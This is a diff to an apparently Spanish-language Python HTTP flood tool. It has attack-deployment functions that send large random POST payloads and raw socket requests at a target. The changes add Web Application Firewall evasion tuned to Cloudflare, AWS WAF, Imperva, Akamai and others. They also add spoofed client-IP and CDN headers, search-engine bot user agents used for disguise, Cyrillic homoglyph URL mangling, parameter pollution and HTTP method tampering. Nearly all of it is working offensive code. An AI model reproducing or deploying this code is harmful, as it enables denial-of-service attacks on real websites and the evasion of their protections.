@@ -144,14 +144,45 @@ attack_stats = {
     "errors": []
 }
 
-# User-Agents para rotación
+# User-Agents para rotación - Base expandida y realista
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15"
+    # Chrome Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+    # Firefox Windows
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+    # Chrome macOS
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+    # Safari macOS
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+    # Chrome Linux
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    # Edge
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+    # Mobile
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+    # Bot-like (para evasión)
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
 ]
+
+# Técnicas de evasión avanzadas
+EVASION_TECHNIQUES = {
+    "url_encoding": True,
+    "case_variation": True,
+    "parameter_pollution": True,
+    "method_tampering": True,
+    "header_injection": True,
+    "cookie_manipulation": True,
+    "protocol_mixing": True,
+    "chunked_encoding": True,
+    "double_encoding": True,
+    "unicode_normalization": True
+}
 
 # ============================================================================
 # CLASES Y UTILIDADES MEJORADAS
@@ -1376,13 +1407,103 @@ def detect_waf_advanced() -> Optional[Dict]:
 # AUTO-CONFIGURACIÓN INTELIGENTE BASADA EN FINGERPRINT
 # ============================================================================
 
+def get_waf_specific_evasion(waf_name: str) -> Dict[str, bool]:
+    """Retorna técnicas de evasión específicas para cada WAF"""
+    waf_evasions = {
+        "cloudflare": {
+            "url_encoding": True,
+            "case_variation": True,
+            "parameter_pollution": True,
+            "header_injection": True,
+            "cookie_manipulation": True,
+            "double_encoding": True,
+            "unicode_normalization": True,
+            "chunked_encoding": False,  # Cloudflare detecta esto
+            "method_tampering": True,
+            "protocol_mixing": False
+        },
+        "aws_waf": {
+            "url_encoding": True,
+            "case_variation": True,
+            "parameter_pollution": True,
+            "header_injection": True,
+            "cookie_manipulation": True,
+            "double_encoding": True,
+            "unicode_normalization": True,
+            "chunked_encoding": True,
+            "method_tampering": True,
+            "protocol_mixing": True
+        },
+        "imperva": {
+            "url_encoding": True,
+            "case_variation": True,
+            "parameter_pollution": True,
+            "header_injection": False,  # Imperva detecta esto
+            "cookie_manipulation": True,
+            "double_encoding": True,
+            "unicode_normalization": True,
+            "chunked_encoding": True,
+            "method_tampering": True,
+            "protocol_mixing": False
+        },
+        "akamai": {
+            "url_encoding": True,
+            "case_variation": True,
+            "parameter_pollution": True,
+            "header_injection": True,
+            "cookie_manipulation": True,
+            "double_encoding": True,
+            "unicode_normalization": True,
+            "chunked_encoding": False,
+            "method_tampering": True,
+            "protocol_mixing": True
+        },
+        "sucuri": {
+            "url_encoding": True,
+            "case_variation": True,
+            "parameter_pollution": True,
+            "header_injection": True,
+            "cookie_manipulation": True,
+            "double_encoding": True,
+            "unicode_normalization": True,
+            "chunked_encoding": True,
+            "method_tampering": True,
+            "protocol_mixing": True
+        },
+        "f5_bigip": {
+            "url_encoding": True,
+            "case_variation": True,
+            "parameter_pollution": True,
+            "header_injection": True,
+            "cookie_manipulation": True,
+            "double_encoding": True,
+            "unicode_normalization": True,
+            "chunked_encoding": True,
+            "method_tampering": True,
+            "protocol_mixing": True
+        }
+    }
+    
+    return waf_evasions.get(waf_name.lower(), {
+        "url_encoding": True,
+        "case_variation": True,
+        "parameter_pollution": True,
+        "header_injection": True,
+        "cookie_manipulation": True,
+        "double_encoding": True,
+        "unicode_normalization": True,
+        "chunked_encoding": True,
+        "method_tampering": True,
+        "protocol_mixing": True
+    })
+
 def auto_configure_from_fingerprint(fingerprint: Dict, waf_info: Optional[Dict] = None):
     """
     Auto-configura el ataque basado en el fingerprint del target.
     Activa automáticamente las mejores estrategias según lo detectado.
     """
     global WAF_BYPASS, STEALTH_MODE, USE_LARGE_PAYLOADS, ATTACK_MODE, RATE_ADAPTIVE
-    global MAX_CONNECTIONS, MAX_THREADS, PAYLOAD_SIZE_KB
+    global MAX_CONNECTIONS, MAX_THREADS, PAYLOAD_SIZE_KB, EVASION_TECHNIQUES
     
     print_color("\n🤖 Auto-configurando estrategia de ataque...", Colors.CYAN, True)
     changes = []
@@ -1395,6 +1516,12 @@ def auto_configure_from_fingerprint(fingerprint: Dict, waf_info: Optional[Dict] 
             changes.append(f"✅ WAF Bypass activado (WAF detectado: {waf_name})")
             log_message("INFO", f"Auto-activando WAF bypass - WAF detectado: {waf_name}")
         
+        # Aplicar técnicas de evasión específicas por WAF
+        waf_specific = get_waf_specific_evasion(waf_name)
+        EVASION_TECHNIQUES.update(waf_specific)
+        changes.append(f"✅ Técnicas de evasión optimizadas para {waf_name}")
+        log_message("INFO", f"Técnicas de evasión configuradas para {waf_name}: {waf_specific}")
+        
         # Ajustes específicos por tipo de WAF
         if waf_name == "cloudflare":
             # Cloudflare es muy agresivo, usar stealth mode
@@ -1404,6 +1531,8 @@ def auto_configure_from_fingerprint(fingerprint: Dict, waf_info: Optional[Dict] 
             # Reducir conexiones para evitar bloqueos
             MAX_CONNECTIONS = min(MAX_CONNECTIONS, 5000)
             changes.append(f"✅ Conexiones reducidas a {MAX_CONNECTIONS} (Cloudflare)")
+            # Cloudflare detecta chunked encoding, desactivarlo
+            EVASION_TECHNIQUES["chunked_encoding"] = False
         
         elif waf_name in ["aws_waf", "imperva", "akamai"]:
             # WAFs empresariales - usar payloads más pequeños y stealth
@@ -1412,6 +1541,9 @@ def auto_configure_from_fingerprint(fingerprint: Dict, waf_info: Optional[Dict] 
                 changes.append(f"✅ Stealth Mode activado ({waf_name})")
             PAYLOAD_SIZE_KB = min(PAYLOAD_SIZE_KB, 512)
             changes.append(f"✅ Payload reducido a {PAYLOAD_SIZE_KB}KB ({waf_name})")
+            # Imperva detecta header injection
+            if waf_name == "imperva":
+                EVASION_TECHNIQUES["header_injection"] = False
     
     # 2. Detección de CDN
     cdn = fingerprint.get("cdn")
@@ -2217,65 +2349,199 @@ def auto_install_core_tools():
 # DESPLIEGUE DE ATAQUES
 # ============================================================================
 
+def generate_evasion_ip() -> str:
+    """Genera IPs falsas realistas para evasión"""
+    # IPs de rangos comunes (no privados)
+    ip_ranges = [
+        (1, 223),  # Rango público válido
+    ]
+    
+    # Generar IP realista
+    first_octet = random.randint(1, 223)
+    # Evitar rangos privados y reservados
+    if first_octet == 10 or first_octet == 127 or (first_octet == 192 and random.random() < 0.5):
+        first_octet = random.choice([8, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20])
+    
+    return f"{first_octet}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
+
+def apply_url_evasion(url: str) -> str:
+    """Aplica técnicas de evasión a URLs"""
+    if not WAF_BYPASS and not STEALTH_MODE:
+        return url
+    
+    # Case variation
+    if EVASION_TECHNIQUES.get("case_variation") and random.random() < 0.3:
+        # Cambiar mayúsculas/minúsculas en path
+        parts = url.split('/')
+        if len(parts) > 3:
+            path_part = '/'.join(parts[3:])
+            # Mezclar mayúsculas/minúsculas aleatoriamente
+            path_evaded = ''.join(c.upper() if random.random() < 0.3 else c.lower() for c in path_part)
+            url = '/'.join(parts[:3]) + '/' + path_evaded
+    
+    # Double encoding
+    if EVASION_TECHNIQUES.get("double_encoding") and random.random() < 0.2:
+        from urllib.parse import quote
+        # Codificar caracteres especiales dos veces
+        if '?' in url:
+            base, query = url.split('?', 1)
+            query_encoded = quote(quote(query, safe=''), safe='')
+            url = f"{base}?{query_encoded}"
+    
+    # Unicode normalization
+    if EVASION_TECHNIQUES.get("unicode_normalization") and random.random() < 0.15:
+        # Agregar caracteres unicode similares
+        url = url.replace('a', 'а') if random.random() < 0.1 else url  # Cyrillic 'a'
+        url = url.replace('o', 'о') if random.random() < 0.1 else url  # Cyrillic 'o'
+    
+    return url
+
 def get_random_headers() -> Dict[str, str]:
-    """Genera headers aleatorios para evasión con técnicas avanzadas"""
+    """Genera headers aleatorios para evasión con técnicas avanzadas y completamente funcionales"""
+    # Headers base realistas
     headers = {
         "User-Agent": random.choice(USER_AGENTS),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-        "Accept-Language": random.choice(["en-US,en;q=0.9", "es-ES,es;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.9"]),
-        "Accept-Encoding": "gzip, deflate, br" if random.random() > 0.3 else "gzip, deflate",
+        "Accept": random.choice([
+            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+            "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
+        ]),
+        "Accept-Language": random.choice([
+            "en-US,en;q=0.9",
+            "es-ES,es;q=0.9,en;q=0.8",
+            "fr-FR,fr;q=0.9,en;q=0.8",
+            "de-DE,de;q=0.9,en;q=0.8",
+            "pt-BR,pt;q=0.9,en;q=0.8"
+        ]),
+        "Accept-Encoding": random.choice([
+            "gzip, deflate, br",
+            "gzip, deflate",
+            "gzip, br",
+            "deflate, br"
+        ]),
         "Connection": "keep-alive" if KEEP_ALIVE_POOLING else random.choice(["keep-alive", "close"]),
         "Upgrade-Insecure-Requests": "1",
-        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store", "private"]),
+        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store", "private", "public, max-age=3600"]),
         "Pragma": random.choice(["no-cache", ""]),
     }
     
     # Headers adicionales para evasión avanzada
     if STEALTH_MODE or WAF_BYPASS:
-        # Rotar Referer
-        headers["Referer"] = random.choice([
-            f"https://www.google.com/search?q={random.choice(['test', 'example', 'web'])}",
-            f"https://www.bing.com/search?q={random.choice(['test', 'example'])}",
-            TARGET
-        ])
+        # Rotar Referer realista
+        referers = [
+            f"https://www.google.com/search?q={random.choice(['test', 'example', 'web', 'search'])}",
+            f"https://www.bing.com/search?q={random.choice(['test', 'example', 'query'])}",
+            f"https://www.google.com/",
+            f"https://www.bing.com/",
+            TARGET,
+            f"https://{DOMAIN}/" if DOMAIN else TARGET
+        ]
+        headers["Referer"] = random.choice(referers)
         
-        # Headers de navegador real
-        headers["Sec-Fetch-Dest"] = random.choice(["document", "empty", "frame"])
-        headers["Sec-Fetch-Mode"] = random.choice(["navigate", "cors", "no-cors"])
-        headers["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site"])
-        headers["Sec-Fetch-User"] = "?1"
+        # Headers de navegador real (Sec-Fetch-*)
+        headers["Sec-Fetch-Dest"] = random.choice(["document", "empty", "frame", "iframe"])
+        headers["Sec-Fetch-Mode"] = random.choice(["navigate", "cors", "no-cors", "same-origin"])
+        headers["Sec-Fetch-Site"] = random.choice(["none", "same-origin", "cross-site", "same-site"])
+        headers["Sec-Fetch-User"] = "?1" if random.random() > 0.3 else ""
         
-        # DNT (Do Not Track)
-        if random.random() > 0.5:
+        # DNT (Do Not Track) - 70% de navegadores lo envían
+        if random.random() > 0.3:
             headers["DNT"] = "1"
+        
+        # Viewport-Width (mobile)
+        if random.random() < 0.2:
+            headers["Viewport-Width"] = str(random.choice([390, 412, 428, 430, 768, 1024]))
+        
+        # Width (mobile)
+        if random.random() < 0.2:
+            headers["Width"] = str(random.choice([390, 412, 428, 430]))
     
     if WAF_BYPASS:
-        # IPs falsas rotativas
-        fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-        headers["X-Forwarded-For"] = fake_ip
-        headers["X-Real-IP"] = fake_ip
-        headers["X-Originating-IP"] = fake_ip
-        headers["X-Remote-IP"] = fake_ip
-        headers["X-Remote-Addr"] = fake_ip
-        headers["X-Client-IP"] = fake_ip
-        headers["X-Forwarded"] = fake_ip
-        headers["Forwarded-For"] = fake_ip
-        headers["Forwarded"] = f"for={fake_ip}"
+        # IPs falsas rotativas - más realistas
+        fake_ip = generate_evasion_ip()
+        
+        # Headers de IP forwarding (todos los posibles)
+        ip_headers = {
+            "X-Forwarded-For": fake_ip,
+            "X-Real-IP": fake_ip,
+            "X-Originating-IP": fake_ip,
+            "X-Remote-IP": fake_ip,
+            "X-Remote-Addr": fake_ip,
+            "X-Client-IP": fake_ip,
+            "X-Forwarded": fake_ip,
+            "Forwarded-For": fake_ip,
+            "Forwarded": f"for={fake_ip};proto={PROTOCOL}",
+            "CF-Connecting-IP": fake_ip,  # Cloudflare
+            "True-Client-IP": fake_ip,  # Cloudflare Enterprise
+            "X-Forwarded-Host": DOMAIN if DOMAIN else "",
+            "X-Original-URL": TARGET if TARGET else "",
+        }
+        
+        # Agregar algunos headers de IP aleatoriamente (no todos para parecer más real)
+        num_ip_headers = random.randint(3, 6)
+        selected_headers = random.sample(list(ip_headers.items()), num_ip_headers)
+        headers.update(dict(selected_headers))
         
         # Headers adicionales de bypass
-        headers["X-Requested-With"] = random.choice(["XMLHttpRequest", ""])
-        headers["Origin"] = random.choice([TARGET, f"https://{random.choice(['google.com', 'example.com'])}"])
+        if random.random() > 0.5:
+            headers["X-Requested-With"] = random.choice(["XMLHttpRequest", "Fetch", ""])
         
-        # Cloudflare bypass headers
-        headers["CF-Connecting-IP"] = fake_ip
-        headers["True-Client-IP"] = fake_ip
+        headers["Origin"] = random.choice([
+            TARGET,
+            f"https://{DOMAIN}" if DOMAIN else TARGET,
+            f"https://www.{DOMAIN}" if DOMAIN else TARGET,
+            "https://www.google.com",
+            "https://www.bing.com"
+        ])
+        
+        # Headers específicos de Cloudflare bypass
+        if random.random() < 0.3:
+            headers["CF-Ray"] = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+            headers["CF-Visitor"] = '{"scheme":"https"}'
+        
+        # Headers de AWS WAF bypass
+        if random.random() < 0.2:
+            headers["X-Amzn-Trace-Id"] = f"Root={''.join(random.choices(string.ascii_letters + string.digits, k=26))}"
+        
+        # Headers de Akamai bypass
+        if random.random() < 0.2:
+            headers["X-Akamai-Request-ID"] = ''.join(random.choices(string.hexdigits, k=32))
+        
+        # Cookie manipulation para evasión
+        if EVASION_TECHNIQUES.get("cookie_manipulation") and random.random() < 0.4:
+            # Agregar cookies falsas comunes
+            fake_cookies = [
+                f"session_id={''.join(random.choices(string.ascii_letters + string.digits, k=32))}",
+                f"csrf_token={''.join(random.choices(string.hexdigits, k=16))}",
+                f"__cfduid={''.join(random.choices(string.hexdigits, k=43))}",
+            ]
+            headers["Cookie"] = "; ".join(random.sample(fake_cookies, random.randint(1, 2)))
+        
+        # Header injection evasion
+        if EVASION_TECHNIQUES.get("header_injection") and random.random() < 0.3:
+            # Agregar headers con caracteres especiales codificados
+            headers["X-Custom-Header"] = f"value{random.choice(['%0a', '%0d', '%09'])}"
+        
+        # Chunked encoding evasion
+        if EVASION_TECHNIQUES.get("chunked_encoding") and random.random() < 0.2:
+            headers["Transfer-Encoding"] = "chunked"
     
     # Headers específicos para HTTP/2
     if HTTP2_MULTIPLEXING:
-        headers[":method"] = "GET"
+        headers[":method"] = random.choice(["GET", "POST", "HEAD"])
         headers[":path"] = "/"
         headers[":scheme"] = PROTOCOL
-        headers[":authority"] = DOMAIN
+        headers[":authority"] = DOMAIN if DOMAIN else ""
+    
+    # Agregar headers de navegador real adicionales
+    if random.random() > 0.5:
+        headers["sec-ch-ua"] = random.choice([
+            '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            '"Not_A Brand";v="8", "Chromium";v="119", "Google Chrome";v="119"',
+            '"Microsoft Edge";v="120", "Chromium";v="120", "Not_A Brand";v="8"'
+        ])
+        headers["sec-ch-ua-mobile"] = "?0"
+        headers["sec-ch-ua-platform"] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
     
     return headers
 
@@ -2696,27 +2962,52 @@ def deploy_custom_http_attack():
                     if TARGET_VARIATIONS:
                         target_url = random.choice([TARGET] + TARGET_VARIATIONS)
                     
+                    # Aplicar técnicas de evasión a la URL
+                    target_url = apply_url_evasion(target_url)
+                    
+                    # Obtener headers con evasión
+                    request_headers = get_random_headers()
+                    
                     # Alternar entre GET y POST con ratio optimizado
                     # Para SSL-VPN, usar más GET ya que POST puede ser rechazado
                     use_post = random.random() < 0.3 if "10443" in TARGET or "ssl" in TARGET.lower() else (random.random() < 0.85 if USE_LARGE_PAYLOADS else False)
+                    
+                    # Method tampering para evasión
+                    if EVASION_TECHNIQUES.get("method_tampering") and WAF_BYPASS and random.random() < 0.1:
+                        # Usar métodos HTTP alternativos
+                        method = random.choice(["GET", "POST", "HEAD", "OPTIONS"])
+                    else:
+                        method = "POST" if use_post else "GET"
                     
                     if use_post:
                         # Payload grande con tamaño variable
                         max_payload = min(PAYLOAD_SIZE_KB * 1024, MAX_PAYLOAD_SIZE_MB * 1024 * 1024)
                         payload_size = random.randint(max_payload // 2, max_payload)
                         payload = ''.join(random.choices(string.ascii_letters + string.digits, k=payload_size))
+                        
+                        # Parameter pollution para evasión
+                        if EVASION_TECHNIQUES.get("parameter_pollution") and random.random() < 0.2:
+                            # Agregar parámetros duplicados
+                            separator = "&" if "?" in target_url else "?"
+                            target_url = f"{target_url}{separator}param1=value1&param1=value2&param2=value3"
+                        
                         response = session.post(
                             target_url, 
                             data=payload, 
-                            headers=get_random_headers(), 
+                            headers=request_headers, 
                             timeout=request_timeout, 
                             verify=False,
                             stream=False  # No stream para mejor rendimiento
                         )
                     else:
+                        # Parameter pollution para GET
+                        if EVASION_TECHNIQUES.get("parameter_pollution") and random.random() < 0.2:
+                            separator = "&" if "?" in target_url else "?"
+                            target_url = f"{target_url}{separator}param1=value1&param1=value2&param2=value3"
+                        
                         response = session.get(
                             target_url, 
-                            headers=get_random_headers(), 
+                            headers=request_headers, 
                             timeout=request_timeout, 
                             verify=False,
                             stream=False,
@@ -2910,13 +3201,26 @@ def deploy_socket_based_attack():
                         sock.connect((DOMAIN, PORT))
                         sock.settimeout(5)
                     
-                    # Construir request HTTP básico
+                    # Construir request HTTP básico con evasión
                     headers = get_random_headers()
                     host_header = f"Host: {DOMAIN}\r\n"
-                    other_headers = "\r\n".join([f"{k}: {v}" for k, v in headers.items()]) + "\r\n"
                     
-                    # Request GET optimizado
-                    request = f"GET / HTTP/1.1\r\n{host_header}{other_headers}\r\n"
+                    # Aplicar evasión a headers para socket-based
+                    # Filtrar headers HTTP/2 que no funcionan en HTTP/1.1
+                    filtered_headers = {k: v for k, v in headers.items() if not k.startswith(':')}
+                    other_headers = "\r\n".join([f"{k}: {v}" for k, v in filtered_headers.items()]) + "\r\n"
+                    
+                    # Aplicar evasión a la URL
+                    path = "/"
+                    if EVASION_TECHNIQUES.get("case_variation") and random.random() < 0.3:
+                        path = "/" + ''.join(random.choices(['/', '?', '&'], k=random.randint(0, 2)))
+                    
+                    # Request GET optimizado con evasión
+                    method = "GET"
+                    if EVASION_TECHNIQUES.get("method_tampering") and WAF_BYPASS and random.random() < 0.1:
+                        method = random.choice(["GET", "HEAD", "OPTIONS"])
+                    
+                    request = f"{method} {path} HTTP/1.1\r\n{host_header}{other_headers}\r\n"
                     
                     sock.sendall(request.encode())
                     
